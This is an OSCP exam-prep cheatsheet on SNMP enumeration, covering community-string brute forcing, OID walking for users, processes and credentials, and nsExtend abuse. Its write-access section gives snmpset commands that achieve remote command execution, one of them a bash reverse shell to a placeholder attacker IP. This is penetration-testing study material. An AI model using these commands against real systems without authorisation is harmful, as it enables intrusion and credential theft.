# 📡 SNMP Enumeration Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> SNMP (Simple Network Management Protocol) runs on UDP/161 and is a goldmine for information gathering.

---

## 📋 Table of Contents
- [SNMP Basics](#-snmp-basics)
- [Community String Brute Force](#-community-string-brute-force)
- [snmpwalk](#-snmpwalk)
- [snmp-check](#-snmp-check)
- [snmpget](#-snmpget)
- [snmpbulkwalk](#-snmpbulkwalk)
- [onesixtyone](#-onesixtyone)
- [braa](#-braa)
- [nmap SNMP Scripts](#-nmap-snmp-scripts)
- [Important OIDs & MIBs](#-important-oids--mibs)
- [Extended Objects — nsExtendObjects](#-extended-objects--nsextendobj)
- [SNMP Write Access Abuse](#-snmp-write-access-abuse)
- [Quick Decision Guide](#-quick-decision-guide)

---

## 📖 SNMP Basics

### Versions
| Version | Security | Notes |
|---------|----------|-------|
| v1 | Community string only | Oldest, least secure |
| v2c | Community string only | Most common, supports bulk queries |
| v3 | Username + password + encryption | Most secure, harder to enum |

### Default Community Strings
```
public      ← most common read-only
private     ← most common read-write
manager
community
```

### Key Ports
```
UDP 161     ← SNMP agent (queries go here)
UDP 162     ← SNMP trap receiver
TCP 161     ← rare, sometimes used
```

### Quick Recon
```bash
# Confirm SNMP is running
nmap -sU -p 161 192.168.1.1
nmap -sU -p 161 192.168.1.0/24

# Full UDP scan to find SNMP
nmap -sU --top-ports 100 192.168.1.1
```

---

## 🔑 Community String Brute Force

### onesixtyone (fastest)
```bash
# Single target with wordlist
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1

# Multiple targets
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -i targets.txt

# Quick test with common strings
onesixtyone 192.168.1.1 public
onesixtyone 192.168.1.1 private

# Sweep entire subnet
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.0/24
```

### hydra
```bash
# Brute force community strings
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1 snmp
```

### nmap
```bash
# Brute force with nmap script
nmap -sU -p 161 --script snmp-brute 192.168.1.1
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1
```

> 💡 **Tip:** Always try `public` and `private` manually first before running a full wordlist — saves time.

---

## 🚶 snmpwalk

> Walks the entire SNMP OID tree and dumps all information.

### Basic Usage
```bash
# Full walk — v1
snmpwalk -v1 -c public 192.168.1.1

# Full walk — v2c (most common)
snmpwalk -v2c -c public 192.168.1.1

# Full walk — v3
snmpwalk -v3 -u username -l authPriv -a MD5 -A authpass -x DES -X privpass 192.168.1.1

# Save output to file
snmpwalk -v2c -c public 192.168.1.1 > snmp_full.txt
```

### Target Specific OIDs
```bash
# System info
snmpwalk -v2c -c public 192.168.1.1 system

# Running processes
snmpwalk -v2c -c public 192.168.1.1 hrSWRunName

# Running processes with arguments (goldmine for creds in CLI args)
snmpwalk -v2c -c public 192.168.1.1 hrSWRunParameters

# Network interfaces
snmpwalk -v2c -c public 192.168.1.1 ifDescr

# Open TCP ports
snmpwalk -v2c -c public 192.168.1.1 tcpConnLocalPort

# Installed software
snmpwalk -v2c -c public 192.168.1.1 hrSWInstalledName

# User accounts
snmpwalk -v2c -c public 192.168.1.1 .1.3.6.1.4.1.77.1.2.25

# Routing table
snmpwalk -v2c -c public 192.168.1.1 ipRouteTable

# ARP table (find other hosts)
snmpwalk -v2c -c public 192.168.1.1 ipNetToMediaPhysAddress

# Storage info
snmpwalk -v2c -c public 192.168.1.1 hrStorageDescr

# Extended objects (custom scripts — often RCE)
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendObjects

# Extended output (actual output of scripts)
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### Useful Flags
```bash
-v1 / -v2c / -v3    # SNMP version
-c public            # community string
-O n                 # print numeric OIDs
-O e                 # print OIDs with symbolic names
-t 10                # timeout in seconds
-r 3                 # retries
-Cc                  # don't check returned OIDs
```

---

## ✅ snmp-check

> Formatted, human-readable SNMP enumeration. Great for quick overview.

```bash
# Basic scan
snmp-check 192.168.1.1

# Specify community string
snmp-check -c public 192.168.1.1

# Specify version
snmp-check -v2c -c public 192.168.1.1

# Detailed output
snmp-check -d 192.168.1.1

# Save output
snmp-check -c public 192.168.1.1 | tee snmp_check_output.txt
```

### What snmp-check Covers
```
✅ System information (hostname, OS, uptime)
✅ Network interfaces
✅ Network IP addresses
✅ Routing information
✅ TCP/UDP connections
✅ Running processes
✅ Installed software
✅ Storage devices
✅ User accounts (Windows)
✅ Share information (Windows)
❌ nsExtendObjects (NOT covered — query manually)
❌ Custom MIBs (NOT covered — query manually)
```

> ⚠️ **Important:** snmp-check does NOT query `nsExtendObjects` — always run that manually after snmp-check.

---

## 🎯 snmpget

> Query a specific OID directly — faster than walking when you know what you want.

```bash
# Get system description
snmpget -v2c -c public 192.168.1.1 sysDescr.0

# Get hostname
snmpget -v2c -c public 192.168.1.1 sysName.0

# Get uptime
snmpget -v2c -c public 192.168.1.1 sysUpTime.0

# Get by numeric OID
snmpget -v2c -c public 192.168.1.1 .1.3.6.1.2.1.1.1.0

# Get contact info
snmpget -v2c -c public 192.168.1.1 sysContact.0

# Get location
snmpget -v2c -c public 192.168.1.1 sysLocation.0
```

---

## 🚀 snmpbulkwalk

> Faster than snmpwalk — uses GETBULK requests. Use for large OID trees.

```bash
# Basic bulk walk
snmpbulkwalk -v2c -c public 192.168.1.1

# Walk specific OID tree
snmpbulkwalk -v2c -c public 192.168.1.1 system

# Faster with increased repetitions
snmpbulkwalk -v2c -c public -Cr50 192.168.1.1

# Save output
snmpbulkwalk -v2c -c public 192.168.1.1 > snmp_bulk.txt
```

> 💡 **Tip:** Use `snmpbulkwalk` instead of `snmpwalk` when the device has a large OID tree — much faster.

---

## 🎯 onesixtyone

> Fast SNMP scanner — best for community string discovery across multiple hosts.

```bash
# Single host
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1

# Multiple hosts from file
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -i hosts.txt

# Subnet sweep
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.0/24

# Custom wordlist
echo -e "public\nprivate\nmanager\ncommunity" > community.txt
onesixtyone -c community.txt 192.168.1.1

# With delay (avoid detection)
onesixtyone -c community.txt -w 100 192.168.1.1
```

---

## ⚡ braa

> Mass SNMP scanner — query multiple hosts simultaneously.

```bash
# Query single OID across subnet
braa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0

# Query system description across range
braa public@192.168.1.0/24:.1.3.6.1.*

# Multiple community strings
braa public@192.168.1.1:.1.3.6.1.2.1.1.1.0
braa private@192.168.1.1:.1.3.6.1.2.1.1.1.0

# Get hostname from multiple hosts
braa public@192.168.1.0/24:.1.3.6.1.2.1.1.5.0
```

---

## 🗺️ nmap SNMP Scripts

```bash
# Basic SNMP info
nmap -sU -p 161 --script snmp-info 192.168.1.1

# Brute force community strings
nmap -sU -p 161 --script snmp-brute 192.168.1.1

# Enumerate interfaces
nmap -sU -p 161 --script snmp-interfaces 192.168.1.1

# Enumerate processes
nmap -sU -p 161 --script snmp-processes 192.168.1.1

# Enumerate Windows users
nmap -sU -p 161 --script snmp-win32-users 192.168.1.1

# Enumerate Windows services
nmap -sU -p 161 --script snmp-win32-services 192.168.1.1

# Enumerate Windows software
nmap -sU -p 161 --script snmp-win32-software 192.168.1.1

# Enumerate network shares
nmap -sU -p 161 --script snmp-win32-shares 192.168.1.1

# Run ALL SNMP scripts at once
nmap -sU -p 161 --script snmp-* 192.168.1.1

# System description
nmap -sU -p 161 --script snmp-sysdescr 192.168.1.1

# Network statistics
nmap -sU -p 161 --script snmp-netstat 192.168.1.1
```

---

## 📊 Important OIDs & MIBs

### System Information
| OID | MIB Name | Description |
|-----|----------|-------------|
| `.1.3.6.1.2.1.1.1.0` | sysDescr | System description (OS, version) |
| `.1.3.6.1.2.1.1.3.0` | sysUpTime | System uptime |
| `.1.3.6.1.2.1.1.4.0` | sysContact | Contact info |
| `.1.3.6.1.2.1.1.5.0` | sysName | Hostname |
| `.1.3.6.1.2.1.1.6.0` | sysLocation | Physical location |

### Processes & Software
| OID | MIB Name | Description |
|-----|----------|-------------|
| `.1.3.6.1.2.1.25.4.2.1.2` | hrSWRunName | Running process names |
| `.1.3.6.1.2.1.25.4.2.1.5` | hrSWRunParameters | **Process CLI args — check for creds!** |
| `.1.3.6.1.2.1.25.6.3.1.2` | hrSWInstalledName | Installed software |

### Network
| OID | MIB Name | Description |
|-----|----------|-------------|
| `.1.3.6.1.2.1.2.2.1.2` | ifDescr | Interface names |
| `.1.3.6.1.2.1.4.20.1.1` | ipAdEntAddr | IP addresses |
| `.1.3.6.1.2.1.4.21.1.1` | ipRouteDest | Routing table |
| `.1.3.6.1.2.1.4.22.1.2` | ipNetToMediaPhysAddress | ARP table |
| `.1.3.6.1.2.1.6.13.1.3` | tcpConnLocalPort | Open TCP ports |
| `.1.3.6.1.2.1.7.5.1.2` | udpLocalPort | Open UDP ports |

### Windows Specific
| OID | MIB Name | Description |
|-----|----------|-------------|
| `.1.3.6.1.4.1.77.1.2.25` | — | **Windows user accounts** |
| `.1.3.6.1.4.1.77.1.2.3.1.1` | — | Windows shares |
| `.1.3.6.1.4.1.77.1.2.27` | — | Windows services |

### Storage
| OID | MIB Name | Description |
|-----|----------|-------------|
| `.1.3.6.1.2.1.25.2.3.1.3` | hrStorageDescr | Storage descriptions |
| `.1.3.6.1.2.1.25.2.3.1.5` | hrStorageSize | Storage size |
| `.1.3.6.1.2.1.25.2.3.1.6` | hrStorageUsed | Storage used |

---

## 🚨 Extended Objects — nsExtendObjects

> **This is NOT covered by standard snmpwalk or snmp-check** — must be queried manually.  
> Net-SNMP extended objects expose custom admin scripts — can lead to **RCE** if misconfigured.

```bash
# Check for extended objects
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendObjects

# Get actual output of scripts
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# Get output line by line
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutLine

# Get script names
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendCommand

# By numeric OID (if MIB not installed)
snmpwalk -v2c -c public 192.168.1.1 .1.3.6.1.4.1.8072.1.3.2
```

### What to Look For
```
- Script output containing passwords or credentials
- Commands running as root
- File paths revealing application structure
- Any output that helps understand the system
```

### If Write Access Available (community string with write perms)
```bash
# Add a new extend command (RCE via SNMP write)
snmpset -v2c -c private 192.168.1.1 \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd"' = createAndGo \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd"' = /bin/bash \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd"' = '-c "id"'

# Read the output
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

---

## ✍️ SNMP Write Access Abuse

> If you find a write community string (often `private`), you can modify device configuration.

```bash
# Test write access
snmpset -v2c -c private 192.168.1.1 sysContact.0 s "test"

# Change hostname
snmpset -v2c -c private 192.168.1.1 sysName.0 s "newname"

# Abuse write access for RCE via extend
snmpset -v2c -c private 192.168.1.1 \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."shell"' = createAndGo \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."shell"' = /bin/bash \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."shell"' = '-c "bash -i >& /dev/tcp/<kali_ip>/9001 0>&1"'
```

---

## 🗺️ Quick Decision Guide

| Situation | Tool & Command |
|-----------|---------------|
| Don't know community string | `onesixtyone -c snmp.txt <ip>` |
| Sweep subnet for SNMP | `onesixtyone -c snmp.txt <subnet>` |
| Quick human-readable overview | `snmp-check -c public <ip>` |
| Full deep enumeration | `snmpwalk -v2c -c public <ip> > out.txt` |
| Fast bulk collection | `snmpbulkwalk -v2c -c public <ip>` |
| Check for custom scripts/RCE | `snmpwalk -v2c -c public <ip> NET-SNMP-EXTEND-MIB::nsExtendObjects` |
| Get script output | `snmpwalk -v2c -c public <ip> NET-SNMP-EXTEND-MIB::nsExtendOutputFull` |
| Find other hosts on network | `snmpwalk -v2c -c public <ip> ipNetToMediaPhysAddress` |
| Find running processes | `snmpwalk -v2c -c public <ip> hrSWRunParameters` |
| Find Windows users | `snmpwalk -v2c -c public <ip> .1.3.6.1.4.1.77.1.2.25` |
| Use nmap scripts | `nmap -sU -p 161 --script snmp-* <ip>` |
| Mass query across subnet | `braa public@<subnet>:.1.3.6.1.*` |
| Test write access | `snmpset -v2c -c private <ip> sysContact.0 s "test"` |

---

## 📋 SNMP Enumeration Checklist

Use this checklist every time you find port 161 open:

```
[ ] 1. Confirm SNMP is open: nmap -sU -p 161 <ip>
[ ] 2. Brute community string: onesixtyone -c snmp.txt <ip>
[ ] 3. Quick overview: snmp-check -c <community> <ip>
[ ] 4. Full walk: snmpwalk -v2c -c <community> <ip> > snmp_full.txt
[ ] 5. Check processes (look for creds in args): snmpwalk ... hrSWRunParameters
[ ] 6. Check Windows users: snmpwalk ... .1.3.6.1.4.1.77.1.2.25
[ ] 7. Check ARP table (find hidden hosts): snmpwalk ... ipNetToMediaPhysAddress
[ ] 8. CHECK nsExtendObjects: snmpwalk ... NET-SNMP-EXTEND-MIB::nsExtendObjects
[ ] 9. CHECK nsExtendOutputFull: snmpwalk ... NET-SNMP-EXTEND-MIB::nsExtendOutputFull
[ ] 10. Test write access: snmpset -v2c -c private <ip> sysContact.0 s "test"
```

---

## 💡 Pro Tips

- **Always check `nsExtendObjects` manually** — no standard tool does this automatically
- **Process arguments** (`hrSWRunParameters`) often contain cleartext credentials passed via CLI
- **ARP table via SNMP** reveals hosts that don't respond to ping — great for network discovery
- **SNMP v1/v2c community strings travel in cleartext** — if you're MITMing, capture with Wireshark/tcpdump
- **`private` community string** often has write access — test `snmpset` if `public` only gives read
- **Install MIBs** if you get `Cannot find module` errors: `sudo apt install snmp-mibs-downloader && sudo download-mibs`
- **UDP makes SNMP unreliable** — if snmpwalk hangs, add `-t 10 -r 3` for longer timeout and retries

---

## 🔧 MIB Installation (Fix "Cannot find module" errors)

```bash
# Install MIB downloader
sudo apt install snmp-mibs-downloader -y

# Download all MIBs
sudo download-mibs

# Enable MIBs in config
sudo nano /etc/snmp/snmp.conf
# Comment out or remove: mibs :

# Or set environment variable
export MIBS=ALL
```

---

## ⚠️ OSCP Exam Notes

| Tool | Allowed? |
|------|---------|
| snmpwalk | ✅ Yes |
| snmp-check | ✅ Yes |
| onesixtyone | ✅ Yes |
| snmpget / snmpset | ✅ Yes |
| braa | ✅ Yes |
| nmap SNMP scripts | ✅ Yes |
| Metasploit SNMP modules | ⚠️ 1 machine limit |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

*Generated for OSCP PEN-200 exam preparation*
